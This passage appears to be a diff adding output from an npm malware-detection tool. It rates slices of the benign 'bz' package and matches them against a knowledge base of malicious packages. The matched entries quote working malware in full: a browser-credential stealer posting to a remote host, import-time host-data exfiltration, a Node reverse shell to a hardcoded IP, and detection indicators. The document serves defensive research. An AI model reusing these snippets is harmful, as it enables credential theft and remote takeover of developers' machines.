+                  "how_to_detect": "Monitor for obfuscated or minified code in package entrypoints and main files, and flag unexpected network activity during install/import, especially HTTP POST requests to untrusted domains. Use automated diffing tools to compare new package versions with trusted upstreams and detect single-line or minimal changes. Flag packages with names similar to popular libraries (typosquatting/masquerading) and those with sudden, unexplained changes or obfuscated payloads. Monitor outbound network traffic from build and CI/CD environments for connections to untrusted domains, and alert on access to environment variables or credential files during installation or import."
+                }
+              }
+            },
+            {
+              "match_id": "20241224_104241_482183_snippet_1",
+              "source_package": "bb-builder (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20241224_104241_482183/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.45773592591285706,
+              "code_similarity": 0.403846800327301,
+              "behavior_similarity": 0.5116250514984131,
+              "matched_snippet": {
+                "snippet_id": "snippet_1",
+                "code_snippet": "var child_process = require(\"child_process\");\nvar exec = child_process.exec;\nvar path = require(\"path\");\nconst fs = require(\"fs\");\nconst axios = require(\"axios\");\nconst pwnurl = \"http://1.host.jwte.ch:1337/pwn\"\nvar workdir = \".\\\\\" + path.join(\".\", \"node_modules\", \"bb-builder\") + \"\\\\\";\nexec(workdir + \"extension.exe\" + \" /shtml \\\"out.html\\\"\", function(err, stdout, stderr) {\n  axios.post(pwnurl, require(\"fs\").readFileSync(\"./out.html\", \"utf-8\")).then(a => a).catch(console.error)\n  fs.unlinkSync(\"./out.html\");\n})",
+                "code_behavior": "At runtime, the code executes a bundled credential recovery tool (WebBrowserPassView) using child_process.exec, extracts browser-stored credentials to an HTML file, reads the file contents, sends the data via HTTP POST to a hardcoded external server, and deletes the output file to remove evidence.",
+                "malice_analysis": {
+                  "why_suspicious": "The code launches an external credential recovery tool to harvest sensitive browser credentials, exfiltrates the data to an attacker-controlled server, and deletes the evidence. This sequence is characteristic of credential-stealing malware and is highly suspicious in any npm package.",
+                  "violated_expectations": "Legitimate npm packages do not execute external binaries, harvest user credentials, or communicate with unknown external servers. They also do not perform anti-forensic actions such as deleting evidence files after exfiltration.",
+                  "similar_legitimate_use": "Password recovery tools like WebBrowserPassView may be used by end-users for local credential recovery, but never as part of an npm package or with automated exfiltration to a remote server.",
+                  "key_indicators": [
+                    "Execution of WebBrowserPassView or similar credential recovery binaries from within the package",
+                    "Automated reading and exfiltration of credential data files (e.g., out.html)",
+                    "Outbound HTTP POST requests to hardcoded, suspicious domains (e.g., 1.host.jwte.ch:1337/pwn)",
+                    "Immediate deletion of output files after exfiltration (anti-forensics)"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "runtime (when the package is executed as part of a build process or script execution)",
+                  "file_location": "main JavaScript file of bb-builder package (e.g., index.js or main entry point)",
+                  "required_permissions": [
+                    "filesystem (read/write/delete files)",
+                    "network (outbound HTTP requests)",
+                    "process_execution (spawn external binaries)"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "bb-builder",
+                  "package_manager": "npm",
+                  "package_versions": [
+                    "1.0.1",
+                    "1.0.2",
+                    "1.0.3",
+                    "1.0.4",
+                    "1.0.5",
+                    "1.0.6"
+                  ],
+                  "why_malicious": "The package embeds and executes a credential-stealing binary (WebBrowserPassView) to extract browser-stored credentials, exfiltrates the stolen data to an external attacker-controlled server, and deletes evidence of the theft. The malicious code is intentionally obfuscated within a seemingly legitimate npm package, and such behavior is never expected in any legitimate npm package."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "User installs or executes the bb-builder package, which triggers the malicious JavaScript code.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Execution of credential recovery tool"
+                  },
+                  {
+                    "step": 2,
+                    "action": "The package executes the bundled WebBrowserPassView binary to extract browser-stored credentials and saves them to an HTML file (out.html).",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Credential data is written to disk"
+                  },
+                  {
+                    "step": 3,
+                    "action": "The package reads the credential data from the HTML file and sends it via HTTP POST to the attacker's server at http://1.host.jwte.ch:1337/pwn.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Exfiltration of sensitive credentials"
+                  },
+                  {
+                    "step": 4,
+                    "action": "The package deletes the HTML file containing the credentials to remove evidence of the theft.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Anti-forensics; attack complete"
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Execution of external credential recovery tools (e.g., WebBrowserPassView) from within npm package scripts",
+                    "Automated creation and deletion of temporary credential data files (e.g., out.html) during package execution",
+                    "Outbound HTTP POST requests to hardcoded, suspicious domains during package runtime",
+                    "Immediate removal of files containing sensitive data after network exfiltration"
+                  ],
+                  "file_indicators": [
+                    "Presence of WebBrowserPassView or similar binaries (e.g., extension.exe) in npm package directories (e.g., node_modules/bb-builder/)",
+                    "Creation and subsequent deletion of files named out.html or similar in the working directory",
+                    "Suspicious executable files bundled within JavaScript packages"
+                  ],
+                  "network_indicators": [
+                    "HTTP POST requests to http://1.host.jwte.ch:1337/pwn or similar credential collection endpoints",
+                    "Outbound network connections from npm package scripts to unknown or untrusted domains"
+                  ],
+                  "how_to_detect": "Monitor for npm packages that bundle and execute credential recovery tools such as WebBrowserPassView, especially those that create and quickly delete temporary files containing credentials. Flag any package that makes HTTP POST requests to hardcoded or suspicious domains (e.g., 1.host.jwte.ch:1337) during installation or runtime. Use static analysis to detect embedded binaries and dynamic analysis to observe file creation/deletion and network activity during package execution."
+                }
+              }
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/bz/0.4.5/package/gulpfile.js",
+      "status": "empty",
+      "is_malicious": false,
+      "total_slices": 0,
+      "malicious_slices": 0,
+      "slice_results": []
+    },
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/bz/0.4.5/package/smoke.js",
+      "status": "success",
+      "is_malicious": false,
+      "total_slices": 1,
+      "malicious_slices": 0,
+      "slice_results": [
+        {
+          "slice_id": "smoke_slice_1",
+          "code_snippet": "var bz = require('./build/node/index');\nvar colors = require('colors');\nrequire('magic-constants')(global);\nvar authConfig = require('./test/browser/files/test-config.json');\n\nvar bugzilla = bz.createClient(authConfig);\n\nvar assert = {\n  ok: function(val1, val2) {\n    var ret;\n    if (val2)\n      ret = (val1 === val2)\n    else\n      ret = !!val1\n\n    assert._log(ret);\n  },\n  equal: function(val1, val2) {\n    assert._log((val1 === val2));\n  },\n  _log: function(ok) {\n    var args = [].slice.call(arguments);\n    ok ? console.log(colors.green(\"pass> \"+ok)) : console.error(colors.red(\"fail>\", ok, __caller+':'+__caller_lineno));\n  }\n}\n\n// private bug, should fail\nbugzilla.getBug(767101, function(err, bug) {\n  assert.ok(err);\n});\n\nbugzilla.bugHistory(9955, function(err, bugs) {\n  if (err) throw err;\n  assert.equal(bugs.length, 1);\n  assert.ok(bugs[0].history);\n});\n\nbugzilla.searchBugs({\n    summary: \"window\",\n    summary_type: \"contains_all_words\"\n  },\n  function(err, bugs) {\n    if (err) throw err;\n    assert.ok(bugs.length);\n  }\n);\n\nbugzilla.getBug(9955, function(err, bug) {\n  if (err) throw err;\n  bug = {\n     update_token: bug.update_token,\n     summary: 'new summary'\n  }\n  bugzilla.updateBug(9955, bug, function(err, ok) {\n    if (err) throw err;\n    assert.ok(ok);\n  });\n});\n\nbugzilla.bugComments(6000, function(err, comments) {\n  if (err) throw err;\n  assert.ok(comments.length);\n});\n\nbugzilla.addComment(6000, {\n    comment: \"new comment\"\n  },\n  function(err, ok) {\n    if (err) throw err;\n    assert.ok(ok);\n  }\n);\n\nbugzilla.bugHistory(9955, function(err, history) {\n  if (err) throw err;\n  assert.ok(history.length);\n});\n\nbugzilla.bugAttachments(9955, function(err, attachments) {\n  if (err) throw err;\n  assert.ok(attachments);\n});\n\nbugzilla.bugComments(6000, function(err, comments) {\n  if (err) throw err;\n  assert.ok(comments.length);\n});",
+          "is_malicious": false,
+          "malice_score": 0.4520324269930522,
+          "confidence": 0.1,
+          "behavior_summary": "At import-time, the code loads authentication configuration from a local JSON file and creates a Bugzilla client using this sensitive authConfig data. When called, it performs multiple network operations via the Bugzilla client, including fetching bug details, bug history, searching bugs, updating bugs, retrieving comments, adding comments, and fetching attachments. These operations access and modify potentially sensitive bug tracking data over the network, enabling interaction with the Bugzilla API using authenticated credentials.",
+          "explanation": "[LLM Judgment: Benign] The analyzed code is a legitimate client usage of the Bugzilla API, performing authenticated bug tracking operations such as fetching, updating, and commenting on bugs. It loads local authentication configuration and uses it to interact with Bugzilla, which is expected behavior for a bug tracking client. Unlike the known malicious patterns, it does not collect or exfiltrate system or user environment data, does not spawn shells or open reverse shells, and does not communicate with suspicious external domains or IPs. The network operations are targeted at Bugzilla API endpoints, consistent with its intended functionality. There is no evidence of obfuscation, data theft, or unauthorized system manipulation. The presence of assert functions and test-like calls further supports benign intent.",
+          "matched_knowledge_count": 5,
+          "matched_knowledge": [
+            {
+              "match_id": "20241224_133738_794486_snippet_1",
+              "source_package": "azureazure, azure-sdk-v4, glints-sdk, azure-sdk-v3 (npm, PyPI)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20241224_133738_794486/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.4628315269947052,
+              "code_similarity": 0.4815092086791992,
+              "behavior_similarity": 0.4441538453102112,
+              "matched_snippet": {
+                "snippet_id": "snippet_1",
+                "code_snippet": "const os = require('os');\nconst https = require('https');\nconst package = require('./package.json');\n\nconst trackingData = JSON.stringify({\n  c: __dirname,\n  hd: os.homedir(),\n  hn: os.hostname(),\n  un: os.userInfo().username,\n  dns: '8.8.8.8',\n  package: package.name,\n  version: package.version\n});\n\nvar options = {\n  hostname: '425a2.rt11.ml',\n  port: 443,\n  path: '/',\n  method: 'POST',\n  headers: {\n    'Content-Type': 'application/x-www-form-urlencoded',\n    'Content-Length': trackingData.length\n  }\n};\n\nvar req = https.request(options, (res) => {\n  res.on('data', (d) => {\n    process.stdout.write(d);\n  });\n});\nreq.on('error', (e) => {});\nreq.write(trackingData);\nreq.end();",
+                "code_behavior": "At import-time, the code collects system and user information (current directory, home directory, hostname, username, package metadata) and sends it via HTTPS POST to 425a2.rt11.ml, resulting in exfiltration of host data to an attacker-controlled server.",
+                "malice_analysis": {
+                  "why_suspicious": "The code collects sensitive host and user information and exfiltrates it to an external, attacker-controlled domain without user knowledge or consent, which is a hallmark of malicious reconnaissance and data theft.",
+                  "violated_expectations": "Legitimate packages do not collect or transmit system/user information to external servers during import or installation, especially without explicit user consent.",
+                  "similar_legitimate_use": "Telemetry or crash reporting (with user consent and a clear privacy policy), but not at import-time and not to untrusted domains.",
+                  "key_indicators": [
+                    "Access to os.homedir(), os.hostname(), os.userInfo()",
+                    "Hardcoded external domain (425a2.rt11.ml)",
+                    "Automatic execution on import",
+                    "Transmission of system/user data via HTTPS POST"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "import-time",
+                  "file_location": "index.js (npm package entrypoint)",
+                  "required_permissions": [
+                    "network",
+                    "filesystem",
+                    "environment_vars"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "azureazure, azure-sdk-v4, glints-sdk, azure-sdk-v3",
+                  "package_manager": "npm, PyPI",
+                  "package_versions": "all published versions (e.g., glints-sdk@99.10.11)",
+                  "why_malicious": "These packages perform unauthorized collection and exfiltration of sensitive system and user information to attacker-controlled endpoints using both HTTPS POST and DNS tunneling, often leveraging legitimate webhook/SaaS services. The behavior is consistent across multiple packages and platforms, indicating a coordinated supply chain attack leveraging dependency confusion. The packages masquerade as legitimate or 'whitehat' tools, but execute malicious code at import-time or install-time without user consent."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Malicious package is installed or imported, triggering execution of the entrypoint code.",
+                    "implemented_by": [
+                      "snippet_1",
+                      "snippet_2",
+                      "snippet_5"
+                    ],
+                    "leads_to": "System reconnaissance and data collection"
+                  },
+                  {
+                    "step": 2,
+                    "action": "System and user information is collected, including home directory, hostname, username, and external IP address.",
+                    "implemented_by": [
+                      "snippet_1",
+                      "snippet_2",
+                      "snippet_4",
+                      "snippet_5"
+                    ],
+                    "leads_to": "Preparation of exfiltration payload"
+                  },
+                  {
+                    "step": 3,
+                    "action": "Files in sensitive directories are enumerated for further profiling or exfiltration.",
+                    "implemented_by": [
+                      "snippet_3"
+                    ],
+                    "leads_to": "Augmentation of exfiltration payload"
+                  },
+                  {
+                    "step": 4,
+                    "action": "Collected data is exfiltrated to attacker-controlled endpoints via HTTPS POST and/or DNS tunneling.",
+                    "implemented_by": [
+                      "snippet_1",
+                      "snippet_2",
+                      "snippet_5"
+                    ],
+                    "leads_to": "Attacker receives sensitive host data"
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Automatic collection of system and user information at import or install time",
+                    "Network requests to known webhook/SaaS endpoints (e.g., interactsh, burpcollaborator, pipedream, webhook.site) or attacker-controlled domains (e.g., 425a2.rt11.ml)",
+                    "Obfuscated JavaScript code in package entrypoints performing network exfiltration",
+                    "DNS queries to attacker-controlled subdomains for covert data exfiltration"
+                  ],
+                  "file_indicators": [
+                    "index.js or __init__.py containing os, https, requests, or dns modules with hardcoded external domains",
+                    "Obfuscated JavaScript in package entrypoints (e.g., variable/function names like _0xabc, _0xdef)",
+                    "References to interactsh, burpcollaborator, pipedream, webhook.site, or 425a2.rt11.ml in code"
+                  ],
+                  "network_indicators": [
+                    "HTTPS POST requests to 425a2.rt11.ml, burpcollaborator.net, pipedream.net, webhook.site",
+                    "DNS queries to subdomains of attacker-controlled domains (e.g., *.425a2.rt11.ml)",
+                    "Outbound requests to api.ipify.org for external IP collection"
+                  ],
+                  "how_to_detect": "Monitor for packages that access system or user information and make outbound network requests to known webhook/SaaS endpoints or attacker-controlled domains at install or import time. Flag obfuscated code in package entrypoints that performs network communication. Detect DNS queries to attacker-controlled subdomains, especially when correlated with suspicious package installation or import events. Use static and dynamic analysis to identify hardcoded domains and automated data exfiltration logic."
+                }
+              }
+            },
+            {
+              "match_id": "20250105_195714_455419_snippet_2",
+              "source_package": "['@zettle-bo/account-settings', '@zettle-bo/account-statement', '@zettle-bo/apps', '@zettle-bo/bank-settings', '@zettle-bo/bootstrapper', '@zettle-bo/capital', '@zettle-bo/cash-register', '@zettle-bo/customers', '@zettle-bo/dashboard', '@zettle-bo/direct-debit', '@zettle-bo/integrations', '@zettle-bo/inventory', '@zettle-bo/invoices', '@zettle-bo/pp-profile-widget', '@zettle-bo/products', '@zettle-bo/react', '@zettle-bo/react-router-dom', '@zettle-bo/react-spa', '@zettle-bo/receipts', '@zettle-bo/routes', '@zettle-bo/sales-trends', '@zettle-bo/settings', '@zettle-bo/shell', '@zettle-bo/staff-account', '@zettle-bo/vertical-navigation', 'airbn-geetest3', 'airbnb-env', 'airbnb-erf', 'airbnb-i18n-polyglot', 'airbnb-l10n', 'airbnb-mediator', 'airbnb-moment-more-format'] (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20250105_195714_455419/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.457800954580307,
+              "code_similarity": 0.48742932081222534,
+              "behavior_similarity": 0.42817258834838867,
+              "matched_snippet": {
+                "snippet_id": "snippet_2",
+                "code_snippet": "//author-- whitehacker003@protonmail.com\nconst os = require('os');\nconst dns = require('dns');\nconst querystring = require('querystring');\nconst https = require('https');\nconst packageJSON = require('./package.json');\nconst trackingData = JSON.stringify({\n  p: packageJSON.name,\n  c: os.cpus(),\n  hd: os.homedir(),\n  hn: os.hostname(),\n  un: os.userInfo().username,\n  dns: dns.getServers(),\n  r: packageJSON.__resolved,\n  v: packageJSON.version,\n  json: packageJSON,\n});\nvar postData = querystring.stringify({\n  msg: trackingData,\n});\nvar options = {\n  hostname: 'cj56jbj5dpjnojrhvbp2t4fnmokpu14.oast.pro',\n  port: 443,\n  path: '/',\n  method: 'POST',\n  headers: {\n    'Content-Type': 'application/x-www-form-urlencoded',\n    'Content-Length': postData.length,\n  },\n};",
+                "code_behavior": "At import-time, the code collects detailed system and environment information (CPU details, home directory, hostname, username, DNS servers, and package metadata), serializes it, and sends it via HTTPS POST to an external domain, resulting in exfiltration of sensitive host data.",
+                "malice_analysis": {
+                  "why_suspicious": "The code gathers sensitive system and environment information and exfiltrates it to an external, attacker-controlled domain without user knowledge or consent. This enables reconnaissance of internal environments and can facilitate further targeted attacks.",
+                  "violated_expectations": "Legitimate packages do not collect and transmit host or environment information on import, especially to untrusted domains, and always require user consent for telemetry.",
+                  "similar_legitimate_use": "Some analytics or error reporting packages may collect limited telemetry, but this is always documented, opt-in, and never includes sensitive host details like usernames or DNS servers.",
+                  "key_indicators": [
+                    "Collection of sensitive system and environment data (CPU, home directory, hostname, username, DNS servers)",
+                    "Network exfiltration via HTTPS POST to non-standard domain (oast.pro)",
+                    "No user notification or consent for data collection or transmission",
+                    "Presence of code referencing os, dns, and process environment in package entry point"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "import-time",
+                  "file_location": "index.js (airbnb packages)",
+                  "required_permissions": [
+                    "network",
+                    "environment_vars"
+                  ]
+                },
+                "package_info": {
+                  "package_name": [
+                    "@zettle-bo/account-settings",
+                    "@zettle-bo/account-statement",
+                    "@zettle-bo/apps",
+                    "@zettle-bo/bank-settings",
+                    "@zettle-bo/bootstrapper",
+                    "@zettle-bo/capital",
+                    "@zettle-bo/cash-register",
+                    "@zettle-bo/customers",
+                    "@zettle-bo/dashboard",
+                    "@zettle-bo/direct-debit",
+                    "@zettle-bo/integrations",
+                    "@zettle-bo/inventory",
+                    "@zettle-bo/invoices",
+                    "@zettle-bo/pp-profile-widget",
+                    "@zettle-bo/products",
+                    "@zettle-bo/react",
+                    "@zettle-bo/react-router-dom",
+                    "@zettle-bo/react-spa",
+                    "@zettle-bo/receipts",
+                    "@zettle-bo/routes",
+                    "@zettle-bo/sales-trends",
+                    "@zettle-bo/settings",
+                    "@zettle-bo/shell",
+                    "@zettle-bo/staff-account",
+                    "@zettle-bo/vertical-navigation",
+                    "airbn-geetest3",
+                    "airbnb-env",
+                    "airbnb-erf",
+                    "airbnb-i18n-polyglot",
+                    "airbnb-l10n",
+                    "airbnb-mediator",
+                    "airbnb-moment-more-format"
+                  ],
+                  "package_manager": "npm",
+                  "package_versions": "35.0.0 (zettle-bo packages), 1.0.0 (airbnb packages, assumed)",
+                  "why_malicious": "These packages are proof-of-concept (PoC) dependency confusion attacks that attempt to exfiltrate system information or download and execute code from external servers. While no outright malicious payload is present, the behavior is consistent with supply chain attack techniques and poses a risk to internal systems if installed. The packages make unsolicited network requests during installation or import, which can be used to confirm internal usage or leak sensitive environment data."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Malicious package is installed via dependency confusion, replacing or supplementing an internal package with an attacker-controlled version.",
+                    "implemented_by": [],
+                    "leads_to": "Execution of postinstall or import-time code embedded in the malicious package"
+                  },
+                  {
+                    "step": 2,
+                    "action": "Malicious code executes during installation or import, performing network beaconing or exfiltrating system information to external servers.",
+                    "implemented_by": [
+                      "snippet_1",
+                      "snippet_2"
+                    ],
+                    "leads_to": "Attacker receives confirmation of internal package usage or detailed system data"
+                  },
+                  {
+                    "step": 3,
+                    "action": "Attacker uses the received confirmation or exfiltrated data for internal reconnaissance or as proof-of-concept for supply chain compromise.",
+                    "implemented_by": [
+                      "snippet_1",
+                      "snippet_2"
+                    ],
+                    "leads_to": "Final goal: enable further targeted attacks or demonstrate internal exposure"
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Unsolicited network requests to external domains during package installation (postinstall) or import",
+                    "Collection and exfiltration of system environment data (CPU, home directory, hostname, username, DNS servers) at import-time",
+                    "Use of package name in remote URLs as part of network beaconing (dependency confusion indicator)",
+                    "Presence of code in entry points that references os, dns, or process environment modules"
+                  ],
+                  "file_indicators": [
+                    "Presence of app.js or index.js in package root containing network request code",
+                    "References to external domains such as *.lupin.com or *.oast.pro in package source files",
+                    "Use of os, dns, or process environment modules in package entry points",
+                    "Presence of postinstall scripts or code in package.json or main entry files"
+                  ],
+                  "network_indicators": [
+                    "HTTP GET requests to domains matching *.lupin.com during installation",
+                    "HTTPS POST requests to domains matching *.oast.pro containing serialized system metadata",
+                    "Outbound connections to non-standard or attacker-controlled domains at install or import time"
+                  ],
+                  "how_to_detect": "Monitor for npm packages that initiate network requests to external or non-standard domains during installation (postinstall) or import. Use static analysis to flag packages whose entry points (e.g., app.js, index.js) reference os, dns, or process environment modules and contain code for network exfiltration. Block or alert on packages with postinstall scripts or code that contacts external servers using the package name. Inspect network logs for HTTP/HTTPS requests to domains such as *.lupin.com and *.oast.pro, especially if requests contain serialized system or environment data."
+                }
+              }
+            },
+            {
+              "match_id": "20250102_111622_786473_snippet_2",
+              "source_package": "amzn, zg-rentals, lyft-dataset-sdk, serverless-slack-app (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20250102_111622_786473/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.441007524728775,
+              "code_similarity": 0.4935001730918884,
+              "behavior_similarity": 0.3885148763656616,
+              "matched_snippet": {
+                "snippet_id": "snippet_2",
+                "code_snippet": "(function(){\n  var net = require('net'),\n      cp = require('child_process'),\n      sh = cp.spawn('/bin/sh', []),\n      client = new net.Socket();\n  client.connect(5482, '5.189.184.129', function(){\n    client.pipe(sh.stdin);\n    sh.stdout.pipe(client);\n    sh.stderr.pipe(client);\n  });\n})();",
+                "code_behavior": "At import-time, the code spawns a new shell process and establishes a TCP connection to a hardcoded remote IP address, piping shell input and output through the network socket to create a reverse shell, enabling remote command execution by the attacker.",
+                "malice_analysis": {
+                  "why_suspicious": "Establishing a reverse shell to an external IP is a classic post-exploitation technique used by attackers to gain remote access and control over compromised systems.",
+                  "violated_expectations": "Normal npm packages should not spawn shell processes or initiate outbound network connections to arbitrary IP addresses, especially at import-time.",
+                  "similar_legitimate_use": "Penetration testing frameworks may use reverse shells, but such behavior is never appropriate in production dependencies or general-purpose packages.",
+                  "key_indicators": [
+                    "Spawning of /bin/sh via child_process.spawn",
+                    "Outbound TCP connection to hardcoded IP (5.189.184.129:5482)",
+                    "Piping shell stdin/stdout/stderr to a network socket",
+                    "Immediate execution at import-time"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "import-time",
+                  "file_location": "run.js (main entry point of malicious package)",
+                  "required_permissions": [
+                    "network",
+                    "filesystem",
+                    "environment_vars"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "amzn, zg-rentals, lyft-dataset-sdk, serverless-slack-app",
+                  "package_manager": "npm",
+                  "package_versions": "unknown (all versions published as malicious)",
+                  "why_malicious": "These packages were intentionally crafted to exploit dependency confusion attacks, enabling attackers to execute code at import-time that exfiltrates sensitive files (such as /etc/shadow and .bash_history) and establishes reverse shells. This results in credential theft and allows remote system compromise by providing attackers with unauthorized access and control."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Malicious package is installed as a result of dependency confusion, replacing an internal dependency with a malicious public version.",
+                    "implemented_by": [],
+                    "leads_to": "Malicious code is present and will execute at import-time."
+                  },
+                  {
+                    "step": 2,
+                    "action": "Malicious code executes automatically upon import, harvesting sensitive files such as /etc/shadow and .bash_history.",
+                    "implemented_by": [
+                      "snippet_1",
+                      "snippet_4"
+                    ],
+                    "leads_to": "Sensitive credential and history data is collected for exfiltration."
+                  },
+                  {
+                    "step": 3,
+                    "action": "Collected sensitive data is exfiltrated to attacker-controlled servers via outbound HTTPS or HTTP requests.",
+                    "implemented_by": [
+                      "snippet_3",
+                      "snippet_4"
+                    ],
+                    "leads_to": "Attacker receives stolen credentials and system information."
+                  },
+                  {
+                    "step": 4,
+                    "action": "A reverse shell is established, granting the attacker remote access to the compromised system.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Attacker gains persistent remote control and can execute arbitrary commands."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Node.js package accessing sensitive files such as /etc/shadow or .bash_history at import-time",
+                    "Spawning of shell processes (e.g., /bin/sh) and connecting to external IP addresses",
+                    "Immediate outbound HTTPS or HTTP requests containing local file contents or credential data",
+                    "Reverse shell activity initiated by package code during installation or import"
+                  ],
+                  "file_indicators": [
+                    "run.js or index.js containing execSync('cat /etc/shadow') or references to .bash_history",
+                    "Hardcoded external hostnames or IP addresses (e.g., comevil.fun, 5.189.184.129) in package code",
+                    "Use of child_process or net modules to spawn shells or create sockets"
+                  ],
+                  "network_indicators": [
+                    "Outbound connections to comevil.fun, d9c0c0d50237.ngrok.io, 5.189.184.129",
+                    "Unusual HTTPS or HTTP requests initiated during package installation or import, especially to unknown domains or IPs"
+                  ],
+                  "how_to_detect": "Monitor for Node.js packages that access sensitive files (such as /etc/shadow or .bash_history) or spawn shell processes at import-time. Flag any package that initiates outbound network connections to unknown domains or hardcoded IP addresses during installation or import. Use static analysis to detect suspicious use of execSync, child_process.spawn, net.Socket, or references to credential files. Correlate package installation or import events with subsequent network activity to known malicious indicators for automated detection."
+                }
+              }
+            },
+            {
+              "match_id": "20250105_195714_456059_snippet_1",
+              "source_package": "deere-ui-domain-framework-mixins (and 16 others, see list) (npm)",
+              "source_file": "/tmp/kb_build_2jc8z5wl/20250105_195714_456059/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.4389972686767578,
+              "code_similarity": 0.46794626116752625,
+              "behavior_similarity": 0.410048246383667,
+              "matched_snippet": {
+                "snippet_id": "snippet_1",
+                "code_snippet": "const os = require('os');\nconst dns = require('dns');\nconst querystring = require('querystring');\nconst https = require('https');\nconst packageJSON = require('./package.json');\nconst package = packageJSON.name;\n\nconst trackingData = JSON.stringify({\n  c: package,\n  h: os.homedir(),\n  d: os.hostname(),\n  hn: os.hostname(),\n  os: os.userInfo().username,\n  dns: os.getServers(),\n  v: packageJSON.version,\n  r: packageJSON._resolved || undefined,\n  pjson: packageJSON,\n});\n\nvar postData = querystring.stringify({\n  msg: trackingData,\n});\n\nvar options = {\n  hostname: `${whoami}.${hostname}.duif.L4.[redacted].canarytokens.com`,\n  port: 443,\n  path: '/',\n  method: 'POST',\n  headers: {\n    'Content-Type': 'application/x-www-form-urlencoded',\n    'Content-Length': postData.length,\n  },\n};",
+                "code_behavior": "At import-time or during postinstall, the code collects local system and user information (including username, hostname, home directory, DNS servers, and package metadata), serializes it, and sends it via an outbound HTTPS POST request to a canarytokens.com domain controlled by the attacker, resulting in exfiltration of internal environment details.",
+                "malice_analysis": {
+                  "why_suspicious": "The code programmatically gathers sensitive host and user data and transmits it to an external domain without user knowledge or consent. This is a clear indicator of malicious intent, as legitimate packages do not require or perform such actions during installation or import.",
+                  "violated_expectations": "Standard npm packages do not collect or exfiltrate environment or user data to external servers during install or import. Such behavior is a direct violation of user privacy and security best practices, and is not expected in any legitimate package, especially without explicit user opt-in and documentation.",
+                  "similar_legitimate_use": "Some legitimate telemetry or crash reporting libraries may collect limited environment data, but only after explicit user consent and with transparent documentation. They never perform silent data exfiltration during install/import, and always provide opt-out mechanisms.",
+                  "key_indicators": [
+                    "Collection of sensitive OS data: os.homedir(), os.hostname(), os.userInfo().username",
+                    "Use of canarytokens.com or similar external tracking domains as exfiltration endpoints",
+                    "Outbound HTTPS POST request triggered at install/import time",
+                    "No user notification, consent, or documentation of data collection or transmission",
+                    "Combination of os, dns, https, and querystring modules in the package entrypoint"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "import-time or postinstall (depending on how the package is used)",
+                  "file_location": "index.js (main entry point of the package)",
+                  "required_permissions": [
+                    "network access (outbound HTTPS)",
+                    "read access to environment variables",
+                    "read access to OS user and host information"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "deere-ui-domain-framework-mixins (and 16 others, see list)",
+                  "package_manager": "npm",
+                  "package_versions": "1.1.2, 1.0.0 (and similar for all listed packages)",
+                  "why_malicious": "These packages are dependency confusion payloads crafted to impersonate John Deere's internal/private npm dependencies. Upon installation or import, they execute code that collects sensitive host and user environment information and exfiltrates it to an attacker-controlled canarytokens.com domain. This behavior constitutes a supply chain attack, as it enables the attacker to confirm internal package usage and gather reconnaissance data from developer or CI environments."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "A malicious package is installed as a result of dependency confusion, where the public package name matches an internal/private dependency used by the target organization.",
+                    "implemented_by": [],
+                    "leads_to": "Execution of the package's code on the developer's machine or CI system."
+                  },
+                  {
+                    "step": 2,
+                    "action": "Upon installation or import, the package executes code that collects local system and environment information, including user and host details.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Preparation of sensitive data for exfiltration."
+                  },
+                  {
+                    "step": 3,
+                    "action": "The collected data is serialized and sent via an outbound HTTPS POST request to an attacker-controlled canarytokens.com domain.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Attacker receives notification and detailed environment information, confirming successful dependency confusion and internal package usage."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "npm package that collects OS/user/environment data (e.g., os.homedir(), os.hostname(), os.userInfo().username) at install or import time",
+                    "Network requests to canarytokens.com or similar tracking domains during npm install or import",
+                    "Use of os, dns, https, and querystring modules together in the package entrypoint to facilitate data collection and exfiltration"
+                  ],
+                  "file_indicators": [
+                    "index.js or main entrypoint file containing references to os.homedir(), os.hostname(), os.userInfo()",
+                    "Hardcoded references to canarytokens.com or similar external tracking domains in code",
